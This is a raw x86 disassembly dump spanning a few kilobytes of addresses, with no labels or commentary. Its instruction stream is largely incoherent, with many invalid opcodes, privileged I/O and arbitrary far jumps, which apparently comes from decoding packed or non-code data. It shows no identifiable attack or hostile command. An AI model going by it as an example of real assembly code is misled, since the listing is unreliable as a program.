  4203cb:	jae    0x420413
  4203cd:	lods   al,BYTE PTR ds:[esi]
  4203ce:	xlat   BYTE PTR ds:[ebx]
  4203cf:	cld    
  4203d0:	pusha  
  4203d1:	inc    edx
  4203d2:	mov    cl,0x75
  4203d4:	in     al,dx
  4203d5:	(bad)  
  4203d6:	sub    al,0x23
  4203d8:	fmulp  st(2),st
  4203da:	loope  0x4203f0
  4203dc:	mov    eax,0x993c6ac0
  4203e1:	inc    ecx
  4203e2:	stc    
  4203e3:	pop    ebx
  4203e4:	mov    BYTE PTR [ebp+0x6d],dh
  4203e7:	push   ebp
  4203e8:	lea    ebx,ds:[ecx-0x7d670815]
  4203ef:	and    dl,BYTE PTR [ecx-0x2bfbf627]
  4203f5:	in     al,0xc8
  4203f7:	add    al,0x71
  4203f9:	cmp    al,0x56
  4203fb:	(bad)  
  4203fc:	addr16 pop esi
  4203fe:	cmp    al,0x5c
  420400:	fcmovne st,st(0)
  420402:	mov    edx,0x3e2cef75
  420407:	push   edx
  420408:	hlt    
  420409:	dec    ecx
  42040a:	push   es
  42040b:	stos   BYTE PTR es:[edi],al
  42040c:	and    DWORD PTR [ebx-0x19],ecx
  42040f:	lods   al,BYTE PTR ds:[esi]
  420410:	jl     0x420427
  420412:	repnz les edi,FWORD PTR [eax]
  420415:	add    cl,BYTE PTR [esi+0x52407ca5]
  42041b:	ret    0x59a8
  42041e:	stc    
  42041f:	push   eax
  420420:	jmp    0x12c1:0xb8f4bde9
  420427:	or     al,0xf5
  420429:	jne    0x4203bd
  42042b:	add    DWORD PTR [edi],esp
  42042d:	ret    0x1c9e
  420430:	mov    edx,0x6a8c105
  420435:	loopne 0x420463
  420437:	adc    cl,ch
  420439:	mov    es,ecx
  42043b:	bound  esp,QWORD PTR [esi+0x5ae3f341]
  420441:	mov    eax,0x97846fe
  420446:	jno    0x42042d
  420448:	out    0x1f,eax
  42044a:	std    
  42044b:	cmp    al,ah
  42044d:	shl    DWORD PTR [eax+0x2bbffb4b],1
  420453:	ins    BYTE PTR es:[edi],dx
  420454:	dec    edx
  420455:	pop    ss
  420456:	(bad)  
  420458:	cmp    DWORD PTR [ecx+0x69],esi
  42045b:	or     BYTE PTR [edi],dh
  42045d:	cmc    
  42045e:	mov    ah,0xa1
  420460:	mov    gs,WORD PTR [eax]
  420462:	(bad)  
  420463:	ja     0x42042c
  420465:	xor    DWORD PTR [ebp+0x2b],esi
  420468:	cmp    bl,BYTE PTR [edx-0x6b]
  42046b:	pusha  
  42046c:	push   edi
  42046d:	pop    ebx
  42046e:	fdivr  QWORD PTR [esp+edi*8]
  420471:	sub    ecx,esi
  420473:	lds    eax,FWORD PTR [ecx]
  420475:	cmp    ebx,esp
  420477:	aad    0x77
  420479:	es pop ds
  42047b:	fs mov bh,0x23
  42047e:	or     BYTE PTR [edi+eiz*4+0x74],bh
  420482:	in     eax,0x6
  420484:	jmp    0xb67f720d
  420489:	inc    edi
  42048a:	dec    edx
  42048b:	call   0x0:0xaf50a4f2
	...
  4204f2:	add    BYTE PTR [eax],al
  4204f4:	scas   al,BYTE PTR es:[edi]
  4204f5:	xchg   esp,eax
  4204f6:	push   edi
  4204f7:	adc    bh,BYTE PTR [edi-0x2d]
  4204fa:	out    dx,eax
  4204fb:	mov    esp,0x5a7f6c39
  420500:	mov    esp,0xec1d18db
  420505:	push   edi
  420506:	add    DWORD PTR [eax],eax
  420508:	add    al,0x1
  42050a:	add    BYTE PTR [eax],al
  42050c:	jmp    0x420584
  42050e:	in     al,dx
  42050f:	mov    ebx,DWORD PTR [ebx+0x48]
  420512:	push   edi
  420513:	sbb    al,cl
  420515:	addr16 sbb eax,0xe097a58
  42051b:	or     eax,0x4c0cb5ce
  420520:	ins    DWORD PTR es:[edi],dx
  420521:	lahf   
  420522:	xchg   esp,eax
  420523:	setb   BYTE PTR [eax-0x4fba8033]
  42052a:	ret    
  42052b:	mov    edx,0x7911135c
  420530:	(bad)  
  420532:	cwde   
  420533:	jp     0x4204bc
  420535:	cmp    bl,BYTE PTR [ebp-0x2974212d]
  42053b:	into   
  42053c:	sub    BYTE PTR [edi-0x42f590c2],al
  420542:	test   DWORD PTR [ebx-0x55720cb9],ecx
  420548:	pushf  
  420549:	mov    ds:0xcb9213ed,al
  42054e:	hlt    
  42054f:	jmp    0x52fe5127
  420554:	clc    
  420555:	ins    BYTE PTR es:[edi],dx
  420556:	(bad)  
  420557:	out    dx,al
  420558:	fsub   DWORD PTR [ecx]
  42055a:	les    ecx,FWORD PTR [esi+0x34]
  42055d:	mov    dl,0x13
  42055f:	pushw  0xe322
  420563:	dec    ebx
  420564:	and    esp,DWORD PTR ds:0x7ccc0b63
  42056a:	aam    0x97
  42056c:	mov    ebp,0x1f26daae
  420571:	xchg   ebx,eax
  420572:	stc    
  420573:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420574:	in     eax,dx
  420575:	mov    al,BYTE PTR [eax+eiz*2+0x2024d571]
  42057c:	mov    eax,0x90bc8e0f
  420581:	aad    0x58
  420583:	or     DWORD PTR [edx*1+0x7c2340e4],edi
  42058a:	daa    
  42058b:	xchg   edi,eax
  42058c:	sahf   
  42058d:	jns    0x4205cc
  42058f:	and    BYTE PTR [ebp+0x7d],cl
  420592:	pop    ss
  420593:	popa   
  420594:	pop    esp
  420595:	mov    al,ds:0xed42cbd1
  42059a:	cwde   
  42059b:	fisttp DWORD PTR [ecx+ebp*1-0x31]
  42059f:	gs pop eax
  4205a1:	(bad)  
  4205a2:	imul   edx,DWORD PTR [edi-0x62],0x3b
  4205a6:	mov    eax,ds:0xf7812936
  4205ab:	and    eax,0x85447c3d
  4205b0:	dec    ecx
  4205b1:	xor    DWORD PTR [esi],esi
  4205b3:	inc    edi
  4205b4:	pop    ds
  4205b5:	and    DWORD PTR [esi-0x59],esp
  4205b8:	div    cl
  4205ba:	repz push edx
  4205bc:	lods   eax,DWORD PTR ds:[esi]
  4205bd:	in     al,0x20
  4205bf:	mov    eax,ds:0x330cd210
  4205c4:	sbb    dl,BYTE PTR [edi-0xd]
  4205c7:	icebp  
  4205c8:	xor    DWORD PTR [edx-0x14b285dd],0x7a778532
  4205d2:	fstp   st(5)
  4205d4:	jp     0x420581
  4205d6:	jnp    0x4205d0
  4205d8:	mov    gs,WORD PTR [edx+edx*4+0x54718e19]
  4205df:	lods   al,BYTE PTR ds:[esi]
  4205e0:	and    DWORD PTR [ebx],eax
  4205e2:	or     BYTE PTR [ebp+ebp*8-0x4e],dl
  4205e6:	loopne 0x420647
  4205e8:	scas   eax,DWORD PTR es:[edi]
  4205e9:	push   eax
  4205ea:	(bad)  
  4205eb:	inc    DWORD PTR [ebx+0x21]
  4205ee:	or     edx,0xffffffab
  4205f1:	push   eax
  4205f2:	rol    ecx,0x8e
  4205f5:	add    ebp,DWORD PTR [ebx]
  4205f7:	sahf   
  4205f8:	jbe    0x4205af
  4205fa:	fisttp QWORD PTR [edi-0x7a9c2a6b]
  420600:	lahf   
  420601:	xchg   ecx,eax
  420602:	test   BYTE PTR [ecx+0x13],dh
  420605:	jmp    0xf21e7331
  42060a:	in     eax,0x95
  42060c:	and    esi,edx
  42060e:	in     al,0x50
	...
  420674:	test   BYTE PTR [eax-0x48],ch
  420677:	or     ah,bh
  420679:	fdiv   DWORD PTR [esp+ebp*8+0x78d500c5]
  420680:	into   
  420681:	sbb    DWORD PTR [eax],esp
  420683:	xlat   BYTE PTR ds:[ebx]
  420684:	lock pop eax
  420686:	add    DWORD PTR [eax],eax
  420688:	add    al,0x1
  42068a:	add    BYTE PTR [eax],al
  42068c:	jmp    0xc280:0x82478ab0
  420693:	outs   dx,DWORD PTR ds:[esi]
  420694:	addr16 inc esp
  420696:	(bad)  [edx+eiz*8+0x38]
  42069a:	scas   al,BYTE PTR es:[edi]
  42069b:	and    bl,bh
  42069d:	lds    edx,FWORD PTR [edi+0x7b]
  4206a0:	aaa    
  4206a1:	xor    dh,BYTE PTR [edi-0x7c]
  4206a4:	sbb    dl,dl
  4206a6:	jbe    0x420669
  4206a8:	sub    eax,0x7ecf27bf
  4206ad:	mov    ah,0x2c
  4206af:	sbb    eax,0x354acf1f
  4206b4:	push   ebp
  4206b5:	xchg   DWORD PTR [eax+0x75efbead],ecx
  4206bb:	and    ebp,DWORD PTR [eax]
  4206bd:	nop
  4206be:	mov    ebp,0x32be21ab
  4206c3:	xor    eax,0x610f896c
  4206c8:	jp     0x420668
  4206ca:	xchg   ecx,eax
  4206cb:	ret    
  4206cc:	and    DWORD PTR [ebx],esi
  4206ce:	lods   eax,DWORD PTR ds:[esi]
  4206cf:	xor    DWORD PTR [edx],esp
  4206d1:	cmp    DWORD PTR [edx-0x94377dc],esi
  4206d7:	rcr    DWORD PTR [edi+0x42],1
  4206da:	sub    DWORD PTR [eax+ebp*8-0x62cf47ce],edi
  4206e1:	sub    DWORD PTR [eax+ecx*8+0x4bb80ba5],esi
  4206e8:	pop    ebp
  4206e9:	mov    bh,0xd1
  4206eb:	xor    ch,BYTE PTR [edi]
  4206ed:	(bad)  
  4206ee:	xchg   ebx,eax
  4206ef:	and    ecx,esp
  4206f1:	add    al,0x93
  4206f3:	inc    eax
  4206f4:	jl     0x4206f0
  4206f6:	sbb    bl,ch
  4206f8:	and    BYTE PTR [edx-0x23],ah
  4206fb:	lahf   
  4206fc:	mov    ecx,0xe6b4ee8d
  420701:	sar    bl,0x8c
  420704:	ja     0x420729
  420706:	cld    
  420707:	push   edx
  420708:	or     bh,BYTE PTR [ebp-0x2f]
  42070b:	(bad)  
  42070c:	loope  0x420748
  42070e:	inc    ecx
  42070f:	addr16 cmp ebp,0xf88ccacb
  420716:	jne    0x42071e
  420718:	mov    DWORD PTR [eax-0x3a07b819],eax
  42071e:	sahf   
  42071f:	mov    esi,0xb59d4f0e
  420724:	popa   
  420725:	jo     0x420727
  420727:	bound  ecx,QWORD PTR [edi+esi*1-0x6b]
  42072b:	mov    al,BYTE PTR [eax+0x39b2f40c]
  420731:	das    
  420732:	daa    
  420733:	jne    0x4207b4
  420735:	mov    ds:0xd1d1db14,al
  42073a:	jo     0x4207ad
  42073c:	aas    
  42073d:	sbb    DWORD PTR [ecx-0x5b2c69d2],esi
  420743:	popf   
  420744:	sub    al,0x9a
  420746:	(bad)  
  420747:	mov    ds,WORD PTR [eax+0xb]
  42074a:	std    
  42074b:	inc    ecx
  42074c:	add    DWORD PTR [eax-0x65d1d624],ecx
  420752:	fld    TBYTE PTR [ecx+0x35]
  420755:	push   0x74
  420757:	loopne 0x4207c5
  420759:	xchg   ecx,ecx
  42075b:	push   eax
  42075c:	jp     0x4206f1
  42075e:	dec    ecx
  42075f:	mov    eax,0xd5101ccc
  420764:	int    0x70
  420766:	xchg   esi,eax
  420767:	xchg   edx,eax
  420768:	ror    DWORD PTR [ecx],1
  42076a:	outs   dx,DWORD PTR ds:[esi]
  42076b:	mov    gs,WORD PTR [edx-0x4d]
  42076e:	imul   BYTE PTR [eax]
  420770:	pusha  
  420771:	xchg   ebx,eax
  420772:	jp     0x4206fe
  420774:	cmp    DWORD PTR [ebx+ebx*1-0x3a58943a],ebp
  42077b:	or     eax,0x77b42794
  420780:	scas   al,BYTE PTR es:[edi]
  420781:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420782:	fnstsw WORD PTR [ecx+0x2f]
  420785:	xor    DWORD PTR [ebx+0x1f],edx
  420788:	fisub  DWORD PTR [eax-0x1624590d]
  42078e:	dec    edx
  42078f:	cmp    DWORD PTR [eax],eax
	...
  4207f1:	add    BYTE PTR [eax],al
  4207f3:	add    BYTE PTR [ecx-0x587fdad1],cl
  4207f9:	mov    ch,BYTE PTR [ebp-0x2390c6d1]
  4207ff:	pusha  
  420800:	push   edx
  420801:	xchg   ecx,eax
  420802:	sub    ah,BYTE PTR [esp+esi*8]
  420805:	pop    ecx
  420806:	add    DWORD PTR [eax],eax
  420808:	add    al,0x1
  42080a:	add    BYTE PTR [eax],al
  42080c:	mov    esi,0x2f873c5d
  420811:	mov    eax,ds:0x475cf8e2
  420816:	sub    edx,DWORD PTR [ebx+0x41914160]
  42081c:	cdq    
  42081d:	cmc    
  42081e:	mov    esi,0x2a1b707a
  420823:	mov    dl,0x6e
  420825:	inc    esp
  420826:	fisubr WORD PTR [ebp+ebx*4+0x6b]
  42082a:	mov    ebp,edi
  42082c:	pusha  
  42082d:	bound  ebx,QWORD PTR [ebx+0x49dcf773]
  420833:	pop    ds
  420834:	add    ebp,DWORD PTR [esi-0x60cf369e]
  42083a:	ucomiss xmm3,DWORD PTR [esi-0x75]
  42083e:	or     BYTE PTR [eax-0x4b0f2d3e],al
  420844:	sar    DWORD PTR [eax],cl
  420846:	lea    esi,ds:[esi]
  420849:	cmp    eax,DWORD PTR [esi-0x29]
  42084c:	mov    dh,0x32
  42084e:	gs mov cl,ch
  420851:	mov    ss,WORD PTR [edi+0x35c96695]
  420857:	clc    
  420858:	in     eax,dx
  420859:	sbb    eax,edi
  42085b:	sbb    DWORD PTR [ebx],0x7e
  42085e:	pop    ds
  42085f:	ds adc al,0x90
  420862:	mov    al,ds:0x7f06ba27
  420867:	cdq    
  420868:	jmp    0xcb41:0xafc51c13
  42086f:	jbe    0x4208c9
  420871:	(bad)  
  420873:	pop    ds
  420874:	imul   ebx,DWORD PTR [ebp+0x6bb39504],0x6361d421
  42087e:	jno    0x420884
  420880:	shl    esi,cl
  420882:	aam    0x4a
  420884:	inc    edx
  420885:	ret    
  420886:	ss inc ebp
  420888:	inc    edi
  420889:	xchg   BYTE PTR [edx],cl
  42088b:	int    0x7b
  42088d:	and    edi,DWORD PTR [eax-0x3268bfc6]
  420893:	cmp    al,dl
  420895:	sbb    DWORD PTR [ebx-0x23],esp
  420898:	inc    eax
  420899:	(bad)  
  42089a:	fbstp  TBYTE PTR [ecx]
  42089c:	add    DWORD PTR [ebp+0x1e],edi
  42089f:	dec    eax
  4208a0:	jne    0x42084c
  4208a2:	mov    eax,ds:0x65e4d982
  4208a7:	add    al,0x7b
  4208a9:	pop    es
  4208aa:	mov    edx,0x1ba94112
  4208af:	jbe    0x4208e9
  4208b1:	test   bl,al
  4208b3:	in     al,0xd1
  4208b5:	sbb    ebp,DWORD PTR [esi+0x14322d3a]
  4208bb:	aas    
  4208bc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4208bd:	or     eax,0xad73eebd
  4208c2:	mov    ds:0x881d7226,eax
  4208c7:	xor    eax,0x48
  4208ca:	dec    edi
  4208cb:	sti    
  4208cc:	mov    DWORD PTR [esi+esi*2-0x1728fd23],eax
  4208d3:	xor    DWORD PTR [eax-0x20a1b6bc],0x19
  4208da:	mov    al,0xd8
  4208dc:	push   ss
  4208dd:	mov    bh,0xf6
  4208df:	jno    0x4208c8
  4208e1:	test   al,0x4e
  4208e3:	outs   dx,BYTE PTR ds:[esi]
  4208e4:	xchg   esp,eax
  4208e5:	aas    
  4208e6:	fadd   st,st(7)
  4208e8:	loop   0x420923
  4208ea:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4208eb:	inc    ebp
  4208ec:	out    dx,eax
  4208ed:	xor    dh,ch
  4208ef:	mov    esp,0xa081604b
  4208f4:	inc    edi
  4208f5:	imul   esp,DWORD PTR [edi],0x10e9a9a8
  4208fb:	(bad)  
  4208fc:	lock xor BYTE PTR [edi-0x2235c22d],ch
  420903:	xchg   ebp,eax
  420904:	and    edx,DWORD PTR [ebp+0x2928878f]
  42090a:	inc    ecx
  42090b:	cmp    DWORD PTR [ecx],ebp
  42090d:	pop    ebx
  42090e:	(bad)  
  42090f:	ja     0x420911
	...
  420971:	add    BYTE PTR [eax],al
  420973:	add    ah,bl
  420975:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420976:	jae    0x4209c5
  420978:	jnp    0x420959
  42097a:	(bad)  
  42097b:	mov    ch,0xd2
  42097d:	ja     0x4209dd
  42097f:	mov    dh,0xca
  420981:	out    0xd9,eax
  420983:	xor    al,0xf8
  420985:	pop    edx
  420986:	add    DWORD PTR [eax],eax
  420988:	add    al,0x1
  42098a:	add    BYTE PTR [eax],al
  42098c:	and    bh,dh
  42098e:	int    0x24
  420990:	rcr    DWORD PTR [ebp-0x41],1
  420993:	pop    eax
  420994:	mov    edx,0xaa6b8944
  420999:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42099a:	cwde   
  42099b:	imul   edx,DWORD PTR ds:[eax+0x3d],0xcc9c2b97
  4209a3:	outs   dx,DWORD PTR ds:[esi]
  4209a4:	ja     0x4209c1
  4209a6:	pop    edi
  4209a7:	push   0x53
  4209a9:	or     al,0xfe
  4209ab:	mov    ch,0x23
  4209ad:	es daa 
  4209af:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4209b0:	hlt    
  4209b1:	test   DWORD PTR [esi+0x3e],eax
  4209b4:	and    al,0xb4
  4209b6:	repz loop 0x42099a
  4209b9:	stc    
  4209ba:	jno    0x420992
  4209bc:	pop    ebx
  4209bd:	mov    esi,0xc048840c
  4209c2:	rcr    BYTE PTR [esi-0x12],0xcd
  4209c6:	cmp    eax,0x2e323e77
  4209cb:	and    eax,0x22ab28b7
  4209d0:	pop    edi
  4209d1:	mov    eax,ds:0x3713ad26
  4209d6:	imul   esi,DWORD PTR [edi],0x72
  4209d9:	xchg   esi,eax
  4209da:	push   ds
  4209db:	adc    eax,0xe12a572c
  4209e0:	out    dx,eax
  4209e1:	fnstenv [ebx]
  4209e3:	test   BYTE PTR [eax+eax*8-0x78a1795a],dl
  4209ea:	mov    al,ds:0xc82f438c
  4209ef:	push   edx
  4209f0:	pop    ss
  4209f1:	or     eax,0x90535ccc
  4209f6:	push   esi
  4209f7:	and    ebp,ebp
  4209f9:	mov    cl,0x53
  4209fb:	jecxz  0x420a3d
  4209fd:	(bad)  
  4209fe:	jne    0x4209ca
  420a00:	add    eax,DWORD PTR [ebx]
  420a02:	cmp    edx,DWORD PTR [ebp-0x44]
  420a05:	ja     0x4209c9
  420a07:	mov    edi,0xcac0feb2
  420a0c:	cmp    al,0x9e
  420a0e:	(bad)  
  420a10:	sbb    edi,0x90570a65
  420a16:	ds cs in ax,0xac
  420a1b:	inc    eax
  420a1c:	lea    esi,[ecx+0x70279e1f]
  420a22:	pop    es
  420a23:	push   eax
  420a24:	mov    bh,0xd4
  420a26:	jae    0x420a51
  420a28:	sub    eax,0x710bd9ea
  420a2d:	add    eax,0x152e5d8
  420a32:	pop    ds
  420a33:	push   ss
  420a34:	pop    ebx
  420a35:	not    bl
  420a37:	mov    ch,0xb5
  420a39:	imul   esi,DWORD PTR [ecx-0x4c],0x17
  420a3d:	dec    ecx
  420a3e:	and    al,0x1c
  420a40:	gs sub eax,0xf00945d6
  420a46:	jae    0x420a55
  420a48:	loope  0x4209f2
  420a4a:	or     BYTE PTR [esi+0x56655734],bl
  420a50:	jmp    0xfbab:0x42028d3b
  420a57:	add    ebp,DWORD PTR [esi+edx*1-0x7c]
  420a5b:	mov    ecx,0x81731bc1
  420a60:	jno    0x420a35
  420a62:	out    0x5e,al
  420a64:	fisubr DWORD PTR [eax+edi*1+0x50]
  420a68:	sub    DWORD PTR [ebp+0x19],ebx
  420a6b:	add    eax,DWORD PTR [ecx+0x34921f51]
  420a71:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420a72:	dec    esp
  420a73:	leave  
  420a74:	loopne 0x4209fc
  420a76:	pop    ss
  420a77:	test   BYTE PTR [edx],bl
  420a79:	popf   
  420a7a:	ins    DWORD PTR es:[edi],dx
  420a7b:	pop    ecx
  420a7c:	pusha  
  420a7d:	mov    al,ds:0xb14249d3
  420a82:	ror    DWORD PTR [ecx-0x2777ec8e],0xbe
  420a89:	cmp    al,0xa7
  420a8b:	loop   0x420b0c
  420a8d:	push   eax
  420a8e:	mov    dl,0x86
	...
  420af4:	fbstp  TBYTE PTR [edx]
  420af6:	scas   eax,DWORD PTR es:[edi]
  420af7:	adc    ebp,edi
  420af9:	lahf   
  420afa:	(bad)  
  420afb:	(bad)  
  420afc:	xlat   BYTE PTR ds:[ebx]
  420afd:	out    dx,eax
  420afe:	(bad)  
  420aff:	cld    
  420b00:	sti    
  420b01:	lahf   
  420b02:	cmp    edi,DWORD PTR [edi]
  420b04:	cld    
  420b05:	pop    ebx
  420b06:	add    DWORD PTR [eax],eax
  420b08:	add    al,0x1
  420b0a:	add    BYTE PTR [eax],al
  420b0c:	adc    bl,BYTE PTR [eax+0x1cd83fa4]
  420b12:	push   ss
  420b13:	rol    DWORD PTR [ecx+0x1d],0x4e
  420b17:	push   edi
  420b19:	mov    esi,0xc1a861ab
  420b1e:	or     bl,BYTE PTR [esi]
  420b20:	clc    
  420b21:	adc    al,0xb2
  420b23:	jmp    0x9718e344
  420b28:	push   ebp
  420b29:	sbb    al,0x24
  420b2b:	push   0xffffff8b
  420b2d:	into   
  420b2e:	or     eax,0x7d96c09a
  420b33:	jle    0x420b7e
  420b35:	pushf  
  420b36:	nop
  420b37:	or     DWORD PTR [ebx+0x65],ecx
  420b3a:	pop    eax
  420b3b:	pusha  
  420b3c:	clc    
  420b3d:	repz sub esi,DWORD PTR [edi+0x19287814]
  420b44:	dec    edx
  420b45:	xor    ebp,esp
  420b47:	in     al,dx
  420b48:	sbb    BYTE PTR [ecx+edx*4+0x17],bh
  420b4c:	cmp    al,0xbd
  420b4e:	out    dx,al
  420b4f:	lea    ecx,[edi]
  420b51:	test   DWORD PTR [ebx-0x1c],edi
  420b54:	sti    
  420b55:	into   
  420b56:	repnz xchg edx,eax
  420b58:	jmp    FWORD PTR [ecx-0x78]
  420b5b:	je     0x420af6
  420b5d:	cmp    dh,BYTE PTR [eax]
  420b5f:	addr16 adc edx,eax
  420b62:	pushf  
  420b63:	scas   eax,DWORD PTR es:[edi]
  420b64:	(bad)  
  420b65:	xchg   ecx,eax
  420b66:	mov    ecx,0xa1c4ad89
  420b6b:	outs   dx,DWORD PTR ds:[esi]
  420b6c:	mov    ecx,ds
  420b6e:	ins    BYTE PTR es:[edi],dx
  420b6f:	jge    0x420b77
  420b71:	sub    al,0x54
  420b73:	outs   dx,DWORD PTR ds:[esi]
  420b74:	jb     0x420b8b
  420b76:	call   0x689b:0x1508251c
  420b7d:	ins    DWORD PTR es:[edi],dx
  420b7e:	out    0x2a,al
  420b80:	ds mov edx,0x52b7b3ac
  420b86:	push   0x6d8da52a
  420b8b:	(bad)  
  420b8c:	(bad)  
  420b8d:	rcl    al,1
  420b8f:	outs   dx,DWORD PTR ds:[esi]
  420b90:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420b91:	xchg   ebp,eax
  420b92:	sbb    eax,0xc837ffd0
  420b97:	outs   dx,BYTE PTR ds:[esi]
  420b98:	jg     0x420bc6
  420b9a:	mov    ecx,DWORD PTR [eax-0x5b]
  420b9d:	mov    ch,0xb6
  420b9f:	pop    ss
  420ba0:	xchg   edi,eax
  420ba1:	jl     0x420b8e
  420ba3:	sub    al,dl
  420ba5:	fwait
  420ba6:	jno    0x420b6b
  420ba8:	push   0xffffffc4
  420baa:	enter  0x437e,0x41
  420bae:	or     BYTE PTR [ebp+0x4cb05d3c],bl
  420bb4:	push   0x567fe444
  420bb9:	push   ebp
  420bba:	jnp    0x420b5a
  420bbc:	retf   
  420bbd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420bbe:	jmp    0x218e1ac
  420bc3:	(bad)  
  420bc5:	ins    DWORD PTR es:[edi],dx
  420bc6:	test   eax,0x43d6aea
  420bcb:	jo     0x420b56
  420bcd:	jmp    0xf2a8c2da
  420bd2:	mov    eax,0xa9f0e85d
  420bd7:	stc    
  420bd8:	sub    DWORD PTR [ebx-0x1d],ebp
  420bdb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420bdc:	adc    eax,0x61886aea
  420be1:	xor    DWORD PTR [ebx],edi
  420be3:	sbb    DWORD PTR [edx+0x70],ebp
  420be6:	outs   dx,BYTE PTR ds:[esi]
  420be7:	push   0xdb6cd9b0
  420bec:	jae    0x420c5c
  420bee:	xchg   BYTE PTR [edi+0x69],ch
  420bf1:	and    BYTE PTR [bp+di-0x50e8],0x14
  420bf7:	ss arpl bx,bx
  420bfa:	xor    al,0x10
  420bfc:	repz sbb al,0x6f
  420bff:	fld    DWORD PTR [edi-0x48]
  420c02:	ds dec esi
  420c04:	push   ecx
  420c05:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420c06:	popa   
  420c07:	mov    ah,0xaf
  420c09:	xor    ecx,edx
  420c0b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420c0c:	dec    edi
  420c0d:	adc    eax,0x5200
	...
  420c72:	add    BYTE PTR [eax],al
  420c74:	mov    dl,BYTE PTR ds:0xbf9fb10b
  420c7a:	mov    edx,0x1886e3f
  420c7f:	in     eax,0xe0
  420c81:	sbb    DWORD PTR [ecx+0x15d00b0],0x10400
  420c8b:	add    bh,cl
  420c8d:	jg     0x420ce5
  420c8f:	mov    esp,0xf589755
  420c94:	or     eax,0x4ec49129
  420c99:	outs   dx,DWORD PTR ds:[esi]
  420c9a:	daa    
  420c9b:	outs   dx,BYTE PTR ds:[esi]
  420c9c:	shl    DWORD PTR [ebx+0x39384220],cl
  420ca2:	sub    edx,DWORD PTR [ebx]
  420ca4:	pop    ebp
  420ca5:	ret    
  420ca6:	inc    ebx
  420ca7:	jbe    0x420cc2
  420ca9:	fmul   DWORD PTR [eax+0x66]
  420cac:	retf   
  420cad:	push   edx
  420cae:	adc    DWORD PTR [edi+edx*1+0x69],eax
  420cb2:	mov    edx,0xa3df768e
  420cb7:	into   
  420cb8:	xor    BYTE PTR [edi-0x6ab15637],bl
  420cbe:	mov    esp,0xb28cad2d
  420cc3:	xor    ecx,edi
  420cc5:	mov    edx,0x4da9fe9c
  420cca:	push   ebp
  420ccb:	and    ecx,DWORD PTR [edi+esi*8+0x2e]
  420ccf:	mov    ch,0xb3
  420cd1:	or     BYTE PTR [edi-0x72],al
  420cd4:	clc    
  420cd5:	jo     0x420cbe
  420cd7:	push   ebx
  420cd8:	sbb    BYTE PTR [ecx+0x6933d21c],bh
  420cde:	xchg   edx,eax
  420cdf:	inc    esi
  420ce0:	stos   BYTE PTR es:[edi],al
  420ce1:	push   edx
  420ce2:	pop    ds
  420ce3:	mov    DWORD PTR [ecx+0xc],esi
  420ce6:	retf   0x6e89
  420ce9:	(bad)  [edi+0x195c0d86]
  420cef:	popa   
  420cf0:	mov    bl,BYTE PTR [ebx+0x10]
  420cf3:	pop    ss
  420cf4:	mov    eax,0xceb24495
  420cf9:	lods   eax,DWORD PTR ds:[esi]
  420cfa:	mov    es,WORD PTR [esi-0x3a]
  420cfd:	ret    
  420cfe:	jg     0x420d5c
  420d00:	pop    esp
  420d01:	call   0xd9f6:0x85c26c5f
  420d08:	sbb    DWORD PTR [ebp+0x2b21b4d],ebx
  420d0e:	(bad)  ss:[ebx+0x5a]
  420d12:	mov    ebx,0x5e453d27
  420d17:	dec    edi
  420d18:	jmp    0x420cc7
  420d1a:	fs xor cl,bh
  420d1d:	pop    ebx
  420d1e:	rcr    BYTE PTR [ecx+0x7e],cl
  420d21:	jno    0x420ce5
  420d23:	aaa    
  420d24:	push   0x378bb200
  420d29:	sbb    eax,0x76d6ce7a
  420d2e:	mov    dl,0xdc
  420d30:	dec    ebp
  420d31:	inc    ecx
  420d32:	sbb    DWORD PTR [ecx-0x6c],esp
  420d35:	ret    
  420d36:	pusha  
  420d37:	lea    ebx,[esi-0x5c189a76]
  420d3d:	sbb    bh,BYTE PTR ds:0x475d6a21
  420d43:	or     al,0x94
  420d45:	test   BYTE PTR [si-0x7e97],0x1a
  420d4b:	pop    edx
  420d4c:	and    eax,0x78d9c495
  420d51:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420d52:	push   esi
  420d53:	xchg   esi,edi
  420d55:	or     DWORD PTR [ebx+ebx*2],ebp
  420d58:	aas    
  420d59:	loope  0x420db2
  420d5b:	stos   DWORD PTR es:[edi],eax
  420d5c:	jb     0x420d9f
  420d5e:	fs mov esi,0x402f0499
  420d64:	xchg   DWORD PTR [ebp-0x7543a20f],edi
  420d6a:	shl    BYTE PTR [edx+esi*1],cl
  420d6d:	dec    DWORD PTR [esi-0x78510ee6]
  420d73:	cmp    al,0xe8
  420d75:	push   0x70e954b6
  420d7a:	cs add ebp,0x38
  420d7e:	lods   eax,DWORD PTR ds:[esi]
  420d7f:	pop    ss
  420d80:	xchg   ebx,eax
  420d81:	dec    ebp
  420d82:	cwde   
  420d83:	hlt    
  420d84:	aad    0x19
  420d86:	das    
  420d87:	dec    ecx
  420d88:	jmp    0xa016:0x1aee8717
  420d8f:	inc    DWORD PTR [eax]
	...
  420df1:	add    BYTE PTR [eax],al
  420df3:	add    bh,ah
  420df5:	push   ds
  420df6:	into   
  420df7:	push   0x9fe7f8ff
  420dfc:	push   esi
  420dfd:	inc    edi
  420dfe:	lahf   
  420dff:	mov    al,ds:0xcfbae249
  420e04:	add    al,0x5e
  420e06:	add    DWORD PTR [eax],eax
  420e08:	add    al,0x1
  420e0a:	add    BYTE PTR [eax],al
  420e0c:	push   edx
  420e0d:	fcom   QWORD PTR [edi+0x19]
  420e10:	jg     0x420d9e
  420e12:	cmp    ch,BYTE PTR [esp+esi*2+0x13219229]
  420e19:	cdq    
  420e1a:	shr    BYTE PTR [ecx+0x5b],1
  420e1d:	inc    esi
  420e1e:	cmp    al,0x81
  420e20:	(bad)  
  420e21:	xor    ecx,DWORD PTR [ebx-0x1a]
  420e24:	stos   BYTE PTR es:[edi],al
  420e25:	xor    al,0x5f
  420e27:	push   0x3f
  420e29:	clc    
